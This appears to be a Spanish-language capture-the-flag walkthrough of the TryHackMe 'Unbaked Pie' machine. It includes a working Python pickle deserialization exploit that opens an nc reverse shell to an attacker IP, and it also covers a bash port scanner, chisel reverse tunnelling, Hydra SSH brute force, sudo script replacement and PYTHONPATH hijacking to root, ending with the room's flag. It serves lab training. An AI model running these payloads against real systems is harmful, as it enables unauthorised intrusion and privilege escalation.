---
layout: post
title: Unbaked-Pie TryHAckMe
tags: [portforwrding,hydra,pickle]
description: Unbaked-Pie TryHackMe
---

- [Enumeración de puertos](#enumeraci-n-de-puertos)
  * [WhatWeb](#whatweb)
  * [Servicio Web (puerto 5003)](#servicio-web--puerto-5003-)
    + [Serialización pickle python](#serializaci-n-pickle-python)
  * [Obteniendo Shell](#obteniendo-shell)
    + [Código malicioso](#c-digo-malicioso)
- [Escalada de Privilegios](#escalada-de-privilegios)
  * [Enumeración de hosts](#enumeraci-n-de-hosts)
  * [Enumeración de puertos](#enumeraci-n-de-puertos-1)
  * [Remote PortForwarding](#remote-portforwarding)
  * [Fuerza Bruta (SSH)](#fuerza-bruta--ssh-)
  * [Iniciando sesion como usuario ramsey](#iniciando-sesion-como-usuario-ramsey)
  * [Obteniedno shell como ramsey](#obteniedno-shell-como-ramsey)
  * [Usuario root](#usuario-root)

![logo](/assets/imgs/unbaked/logo.png)

## Enumeración de puertos

```
# Nmap 7.91 scan initiated Sat Sep  4 16:54:02 2021 as: nmap -p5003 -sC -sV -Pn -oN targeted 10.10.113.185
Nmap scan report for 10.10.113.185
Host is up (0.18s latency).

PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sat, 04 Sep 2021 21:54:10 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=5RmYtAxW0OydEtWWMJHDbOPvltNR4gD45r5FiAefUTVxJP1sYdb9bz3quk5Qn3Y0; expires=Sat, 03 Sep 2022 21:54:10 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 04 Sep 2021 21:54:11 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=kMffpmmM3zP94KtCLucCDoyLYL5x5jzBPj464tF1w7rss0XnlZMGoaxad2Ah7sq6; expires=Sat, 03 Sep 2022 21:54:11 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5003-TCP:V=7.91%I=7%D=9/4%Time=6133EB02%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1DE7,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2004\x20Sep\x202
SF:021\x2021:54:10\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.6
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x2
SF:0DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie:\x2
SF:0\x20csrftoken=5RmYtAxW0OydEtWWMJHDbOPvltNR4gD45r5FiAefUTVxJP1sYdb9bz3q
SF:uk5Qn3Y0;\x20expires=Sat,\x2003\x20Sep\x202022\x2021:54:10\x20GMT;\x20M
SF:ax-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20html>
SF:\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf-8\"
SF:>\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
SF:x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\"des
SF:cription\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20conten
SF:t=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x20<!-
SF:-\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/static/v
SF:endor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\n\x2
SF:0\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x20\x2
SF:0<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs")%r(H
SF:TTPOptions,1DE7,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2004\x20Sep\x
SF:202021\x2021:54:11\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8
SF:\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:
SF:\x20DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie:
SF:\x20\x20csrftoken=kMffpmmM3zP94KtCLucCDoyLYL5x5jzBPj464tF1w7rss0XnlZMGo
SF:axad2Ah7sq6;\x20expires=Sat,\x2003\x20Sep\x202022\x2021:54:11\x20GMT;\x
SF:20Max-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf-
SF:8\">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-widt
SF:h,\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\"
SF:description\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20con
SF:tent=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x20
SF:<!--\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/stati
SF:c/vendor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\n
SF:\x20\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x20
SF:\x20<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs");
```

### WhatWeb

La herramienta `whatweb` nos reporta que el sitio web estahaciendo uso del framework `Django` propia del lenguaje `python`.

```
❯ whatweb http://10.10.104.209:5003/
http://10.10.104.209:5003/ [200 OK] Bootstrap, Cookies[csrftoken], Country[RESERVED][ZZ], Django, HTML5, HTTPServer[WSGIServer/0.2 CPython/3.8.6], IP[10.10.104.209], JQuery, Script, Title[[Un]baked | /], UncommonHeaders[x-content-type-options,referrer-policy], X-Frame-Options[DENY]
```

### Servicio Web (puerto 5003)

![unbaked](/assets/imgs/unbaked/web.png)

Al realizar una enumeración de subdirectorios no encontraremos nada importante que nos lleve a comprometer el el equipo.  
Pero si nos fijamos más a detalle en la salida de `nmap` encontramos en las cabeceras algo interesante que nos pueda ayudar.

Dentro de la web se muestra un apartado de una funcionalidad de busqueda.  
Si observamos las cookies que se tramitan en la petición POST notaremos algo interesante. Una nueva cookie `search_cookie` que aparenta ser un objeto de serialización en Python.

Por aquí dejo un buen articulo donde se muestra en mas detalle sobre la vulnerabilidad [Python_Pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).

#### Serialización pickle python

**Descripción**  
La biblioteca estándar de Python tiene un módulo llamado `pickle` que se usa para serializar y deserializar objetos. En general, se considera peligroso extraer datos de cualquier fuente que no sea de confianza.  
Se determinó que esta aplicación web extrae datos de la entrada controlada por el usuario.

**Remediación**  
El módulo pickle no está destinado a ser seguro contra datos construidos erróneamente o maliciosamente. Nunca elimine los datos recibidos de una fuente no confiable o no autenticada.

![cookie](/assets/imgs/unbaked/cookie.png)

### Obteniendo Shell

#### Código malicioso

```
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.102.237 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

```
❯ python3 exploit.py
b'gASVbwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFRybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxIHwgbmMgMTAuOS4xMDIuMjM3IDQ0NDQgPiAvdG1wL2aUhZRSlC4='
```

Intercapto una petición web y desde burp modifico la cookie `search_cookie` con el valor serializado.

![burp](/assets/imgs/unbaked/burp.png)

Enviamos la petición y obtenemos una shell

![shell](/assets/imgs/unbaked/shell.png)

Ahora nos encontramos en un contenedor.  
Leemos el fichero `.bash_history` para obetener información de otra subred que es visible en el equipo.

```
[...]
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
[...]
```

## Escalada de Privilegios

### Enumeración de hosts

```
#!/bin/bash
for i in $(seq 1 254); do
        ping -c 1 172.17.0.$i | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done
```

### Enumeración de puertos

```
#!/bin/bash
for port in $(seq 1 65535); do
        timeout 1 bash -c "echo > /dev/tcp/172.17.0.1/$port" 2>/dev/null && echo "Port $port - OPEN" &
done; wait
```

Encontramos el puerto 22 (ssh) abierto.
```
root@8b39a559b296:~# ./scanPorts.sh
Port 22 - OPEN
Port 5003 - OPEN
```

### Remote PortForwarding

Para el redireccionamiento de puertos se hará uso de la herramienta `chisel`.  
Para ello nos transferimos el ejecutable de chisel que lo puede s encontrar [aquí](https://github.com/jpillora/chisel/releases).

Desde el lado del atacante

```
❯ chisel server -p 1234 --reverse
```

Desde el lado de la maquina víctima

```
root@8b39a559b296:~# ./chisel client 10.9.102.237:1234 R:2222:172.17.0.1:22
```

Si hago un escaneo a los servicios que se ejecutan en la máquina atacante se observará el puerto `2222` abierto que redirecciona al servicio `ssh` del host `172.17.0.1`.

```
❯ nmap localhost
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 22:50 -05
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000096s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT     STATE SERVICE
1234/tcp open  hotline
2222/tcp open  EtherNetIP-1
```

### Fuerza Bruta (SSH)

| argumento | descripcion                                      |
| --------- | ------------------------------------------------ |
| -l        | nombre de usuario                                |
| -P        | diccionario de contraseñas                       |
| -s        | puerto                                           |
| -V        | modo detallado                                   |
| -f        | detener ataque una vez obtenida las credenciales |


![hydra](/assets/imgs/unbaked/hydra.png)

### Iniciando sesion como usuario ramsey

```
❯ ssh ramsey@172.17.0.1 -p2222
ramsey@172.17.0.1's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


39 packages can be updated.
26 updates are security updates.


Last login: Tue Oct  6 22:39:31 2020 from 172.17.0.2
ramsey@unbaked:~$
```

### Obteniedno shell como ramsey

```
ramsey@unbaked:~$ sudo -l
[sudo] password for ramsey:
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```

```
ramsey@unbaked:~$ rm -rf vuln.py
ramsey@unbaked:~$ nano vuln.py
ramsey@unbaked:~$ cat vuln.py

#!/usr/bin/python

import os
os.system("/bin/bash -p")

ramsey@unbaked:~$ sudo -u oliver  /usr/bin/python /home/ramsey/vuln.py
oliver@unbaked:~$ id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
```

### Usuario root

```
root@unbaked:/tmp# cat docker.py
#!/usr/bin/python
import os
os.system("/bin/bash -p")

oliver@unbaked:/tmp$ sudo PYTHONPATH=`pwd` /usr/bin/python /opt/dockerScript.py
root@unbaked:/tmp# whoami
root
root@unbaked:/tmp# cat /root/root.txt
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: THM{1ff4c893b3d8830c1e188a3728e90a5f}
```
